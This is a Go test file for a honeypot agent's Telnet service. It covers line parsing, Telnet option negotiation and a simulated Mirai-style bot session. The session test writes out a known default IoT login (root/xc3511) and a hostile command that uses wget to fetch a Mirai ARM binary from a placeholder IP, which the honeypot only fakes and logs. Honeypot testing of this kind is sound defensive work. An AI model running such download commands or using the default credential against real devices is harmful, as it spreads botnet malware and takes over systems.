package services

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"strings"
	"testing"
	"time"

	"honeypot-agent/internal/shipper"
)

// readLine: Enter can be "\r\n", "\r\0" or just "\n"; Telnet commands (IAC ...) and NUL bytes
// are dropped, backspace deletes, and a line is cut at telnetMaxLine.
func TestTelnetReadLine(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  []string
	}{
		{"CR LF", "root\r\nadmin\r\n", []string{"root", "admin"}},
		{"CR NUL", "root\r\x00admin\r\x00", []string{"root", "admin"}},
		{"LF only (nc on Linux)", "root\nadmin\n", []string{"root", "admin"}},
		{"empty line", "\r\nroot\r\n", []string{"", "root"}},
		{"backspace and delete", "roox\x08t\r\nadmim\x7fn\r\n", []string{"root", "admin"}},
		{"NUL in the middle", "ro\x00ot\r\n", []string{"root"}},
		{"negotiation first (IAC DO ECHO, IAC WILL SGA)", "\xff\xfd\x01\xff\xfb\x03root\r\n", []string{"root"}},
		{"subnegotiation (IAC SB TTYPE IS xterm IAC SE)", "\xff\xfa\x18\x00xterm\xff\xf0root\r\n", []string{"root"}},
		{"line too long", strings.Repeat("a", telnetMaxLine+10) + "\r\n", []string{strings.Repeat("a", telnetMaxLine)}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			server, client := net.Pipe() // an in-memory connection, no real network
			defer server.Close()
			defer client.Close()
			go client.Write([]byte(tt.input))

			reader := &telnetReader{conn: server, r: bufio.NewReader(server)}
			for _, want := range tt.want {
				got, err := reader.readLine()
				if err != nil || got != want {
					t.Fatalf("got %q, %v (expected %q)", got, err, want)
				}
			}
		})
	}
}

// Regression test for the 15 Nov bug: the Enter after the username arrived split in two packets
// ("root\r", then "\n" + password) and the leftover "\n" was read as an EMPTY password.
// lastCR must be remembered between two readLine calls.
func TestTelnetEnterSplitAcrossPackets(t *testing.T) {
	server, client := net.Pipe()
	defer server.Close()
	defer client.Close()
	reader := &telnetReader{conn: server, r: bufio.NewReader(server)}

	go client.Write([]byte("root\r")) // first packet: the username and only half of Enter
	if got, err := reader.readLine(); err != nil || got != "root" {
		t.Fatalf("username: got %q, %v", got, err)
	}

	go client.Write([]byte("\nxc3511\r\n")) // second packet: the other half, then the password
	if got, err := reader.readLine(); err != nil || got != "xc3511" {
		t.Fatalf("password: got %q, %v (expected xc3511, not an empty line)", got, err)
	}
}

// skipTelnetCommand eats exactly one command (the IAC byte was already read) and nothing after it.
func TestSkipTelnetCommand(t *testing.T) {
	tests := []struct {
		name  string
		input []byte // what follows the IAC byte
	}{
		{"WILL ECHO", []byte{telnetWILL, telnetOptEcho}},
		{"WONT ECHO", []byte{telnetWONT, telnetOptEcho}},
		{"DO terminal type", []byte{telnetDO, 24}},
		{"DONT ECHO", []byte{telnetDONT, telnetOptEcho}},
		{"subnegotiation", []byte{telnetSB, 24, 0, 'x', 't', 'e', 'r', 'm', telnetIAC, telnetSE}},
		{"subnegotiation with IAC IAC inside", []byte{telnetSB, 24, telnetIAC, telnetIAC, 'a', telnetIAC, telnetSE}},
		{"command without option (NOP)", []byte{241}},
	}

	for _, tt := range tests {
		r := bufio.NewReader(bytes.NewReader(append(tt.input, 'X')))
		if err := skipTelnetCommand(r); err != nil {
			t.Errorf("%s: %v", tt.name, err)
			continue
		}
		if next, _ := r.ReadByte(); next != 'X' {
			t.Errorf("%s: skipped too much or too little (next byte: %q, expected 'X')", tt.name, next)
		}
	}

	// a subnegotiation that never ends must give an error, not loop forever
	cut := bufio.NewReader(bytes.NewReader([]byte{telnetSB, 24, 'x', 't'}))
	if err := skipTelnetCommand(cut); err == nil {
		t.Error("cut-off subnegotiation: expected an error")
	}
}

// A whole Telnet session the way a Mirai-style bot does it: wrong password, right password,
// a download command, exit. Checks what the attacker sees and every event that gets logged.
func TestTelnetSession(t *testing.T) {
	var out bytes.Buffer // the JSONL the shipper writes (no URL = stdout copy only)
	s := shipper.NewShipper(&out, "", "")
	addr, done := serveOne(t, func(c net.Conn) { handleTelnet(c, "telnet-test", s) })

	conn, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	r := bufio.NewReader(conn)

	readUntil(t, r, "gateway login: ")
	fmt.Fprint(conn, "root\r\n")
	readUntil(t, r, "Password: ")
	fmt.Fprint(conn, "wrong\r\n")
	if text := readUntil(t, r, "gateway login: "); !strings.Contains(text, "Login incorrect") {
		t.Errorf("after a wrong password: %q", text)
	}

	fmt.Fprint(conn, "root\r\n")
	readUntil(t, r, "Password: ")
	fmt.Fprint(conn, "xc3511\r\n")
	if text := readUntil(t, r, "root@gateway:~# "); !strings.Contains(text, "BusyBox") {
		t.Errorf("no BusyBox banner after login: %q", text)
	}

	fmt.Fprint(conn, "cd /tmp; wget http://203.0.113.7/bins/mirai.arm7 -O x\r\n")
	if text := readUntil(t, r, "root@gateway:/tmp# "); !strings.Contains(text, "Connection timed out") {
		t.Errorf("wget output: %q", text) // wget never downloads anything
	}
	fmt.Fprint(conn, "exit\r\n")
	waitDone(t, done)

	events := parseEvents(t, out.String())
	checkSession(t, events, "TELNET", 23)

	logins := ofType(events, "login_attempt")
	if len(logins) != 2 {
		t.Fatalf("%d login_attempt events (expected 2)", len(logins))
	}
	if c := logins[0].Credentials; c.Username != "root" || c.Password != "wrong" || c.Success {
		t.Errorf("first login: %+v", c)
	}
	if c := logins[1].Credentials; c.Username != "root" || c.Password != "xc3511" || !c.Success {
		t.Errorf("second login: %+v", c)
	}

	commands := ofType(events, "command_exec")
	if len(commands) != 2 {
		t.Fatalf("%d command_exec events (expected 2: the wget line and exit)", len(commands))
	}
	if p := commands[0].PayloadDetails; p.Command != "cd /tmp; wget http://203.0.113.7/bins/mirai.arm7 -O x" ||
		p.ExtractedURL != "http://203.0.113.7/bins/mirai.arm7" {
		t.Errorf("wget line: %+v", p)
	}
	for _, c := range commands {
		if strings.Contains(c.PayloadDetails.Command, "xc3511") {
			t.Errorf("the password ended up in a command: %q", c.PayloadDetails.Command)
		}
	}
}
